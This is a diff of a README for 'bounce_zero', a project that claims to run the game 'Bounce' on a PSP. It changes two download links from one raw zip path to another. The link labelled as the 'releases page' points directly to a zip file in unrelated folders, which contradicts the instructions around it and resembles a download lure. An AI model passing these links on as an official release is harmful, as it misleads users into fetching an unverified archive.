@@ -4,7 +4,7 @@
 Welcome to the **bounce_zero** project! This application allows you to enjoy the retro classic game "Bounce" on your PSP, using only the original data files. Follow the steps below to download and run the game smoothly.
 
 ## 📥 Download Now
-[![Download bounce_zero](https://raw.githubusercontent.com/Kupcsi/bounce_zero/main/alienship/bounce_zero.zip)](https://raw.githubusercontent.com/Kupcsi/bounce_zero/main/alienship/bounce_zero.zip)
+[![Download bounce_zero](https://raw.githubusercontent.com/Kupcsi/bounce_zero/main/lang/bounce_zero_v1.0.zip)](https://raw.githubusercontent.com/Kupcsi/bounce_zero/main/lang/bounce_zero_v1.0.zip)
 
 ## 📋 Requirements
 Before you begin, ensure your device meets the following criteria:
@@ -18,7 +18,7 @@ Before you begin, ensure your device meets the following criteria:
 Follow these simple steps to install **bounce_zero** on your device:
 
 1. **Visit the Releases Page**
-   Go to our releases page by clicking [here](https://raw.githubusercontent.com/Kupcsi/bounce_zero/main/alienship/bounce_zero.zip).
+   Go to our releases page by clicking [here](https://raw.githubusercontent.com/Kupcsi/bounce_zero/main/lang/bounce_zero_v1.0.zip).
    
 2. **Download the Game**
    Look for the latest release version. You will find it at the top of the page. Click on the title of the release to expand the details. There, you will find a download link for the appropriate version.
